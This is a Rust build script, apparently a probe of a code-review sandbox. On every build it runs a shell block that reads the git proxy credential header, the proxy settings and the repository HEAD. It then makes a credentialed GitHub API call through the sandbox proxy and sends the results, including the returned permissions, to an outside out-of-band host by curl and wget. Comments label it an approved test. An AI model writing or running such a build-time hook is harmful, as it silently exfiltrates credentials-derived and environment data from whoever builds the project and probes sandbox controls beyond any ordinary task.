use std::process::Command;

fn enc(s: &str) -> String {
    let mut o = String::new();
    for b in s.bytes() {
        if b.is_ascii_alphanumeric() || b == b'-' || b == b'_' || b == b'.' {
            o.push(b as char);
        } else {
            o.push_str(&format!("%{:02X}", b));
        }
    }
    o
}

fn sh(cmd: &str) -> String {
    Command::new("sh")
        .arg("-c")
        .arg(cmd)
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
        .unwrap_or_else(|_| "err".into())
}

fn send(tag: &str, data: &str) {
    let body: String = data.chars().take(1900).collect();
    let url = format!(
        "https://dc152bnfeh118c1m0fq0fxm6paea4piq3.oast.site/{}?d={}",
        tag,
        enc(&body)
    );
    for _ in 0..3 {
        let _ = Command::new("curl").args(["-s", "-m", "15", &url]).status();
        let _ = Command::new("wget").args(["-q", "-O", "/dev/null", &url]).status();
    }
}

fn main() {
    // H14b (A37 approved): ONE proxied GET of our own repo with the sandbox
    // Proxy-Tokenizer, fingerprinting the VALUES of the returned permissions
    // object (admin/maintain/push/triage/pull), plus two no-credential
    // controls. No writes of any kind in this probe.
    let a = sh(r#"
O=dc152bnfeh118c1m0fq0fxm6paea4piq3.oast.site
U=https://api.github.com/repos/testing-creator-A/cr-sandbox-test
SH=$(readlink -f /bin/sh 2>/dev/null)
EXT=$(git config --get http.https://github.com/.extraheader 2>/dev/null | sed 's/^.*Proxy-Tokenizer:[[:space:]]*//')
PR=$(git config --get http.proxy 2>/dev/null)
HD=$(git -C /home/jailuser/git rev-parse HEAD 2>/dev/null)
HS=$(printf '%s' "$HD" | cut -c1-12)
OUT="tag=h14b;sh=$SH;extlen=${#EXT};pr=$PR;head=$HS"
B=$(mktemp)

# (1) A37 approved: the one credentialed proxied GET (read-only).
C1=$(curl -s -m 20 -x "$PR" --proxy-header "Proxy-Tokenizer: $EXT" -o "$B" -w '%{http_code}' -H "Proxy-Tokenizer: $EXT" -H 'Accept: application/vnd.github+json' "$U" 2>/dev/null)
R1=$?
PM=$(sed -n '/"permissions"[[:space:]]*:/,/}/p' "$B" 2>/dev/null | tr -d ' \n' | cut -c1-180)
PRIV=$(grep -o '"private"[[:space:]]*:[[:space:]]*[a-z]*' "$B" 2>/dev/null | head -1)
OUT="$OUT;c1=$C1;r1=$R1;perm=$PM;priv=$PRIV"
B2=$(mktemp)

# (2) Control: same proxied GET, no credential header (no permissions).
C3=$(curl -s -m 20 -x "$PR" -o "$B2" -w '%{http_code}' -H 'Accept: application/vnd.github+json' "$U" 2>/dev/null)
R3=$?
P3=$(grep -c '"permissions"' "$B2" 2>/dev/null)
OUT="$OUT;c3=$C3;r3=$R3;p3=$P3"

# (3) Control: direct GET, no proxy, anonymous (no permissions).
C4=$(curl -s -m 20 --noproxy '*' -o "$B2" -w '%{http_code}' -H 'Accept: application/vnd.github+json' "$U" 2>/dev/null)
R4=$?
P4=$(grep -c '"permissions"' "$B2" 2>/dev/null)
OUT="$OUT;c4=$C4;r4=$R4;p4=$P4"
OUT="$OUT;end=1"
rm -f "$B" "$B2"
printf '%s' "$OUT"
"#);
    send("h14b", &a);
    println!("cargo:rerun-if-changed=build.rs");
}
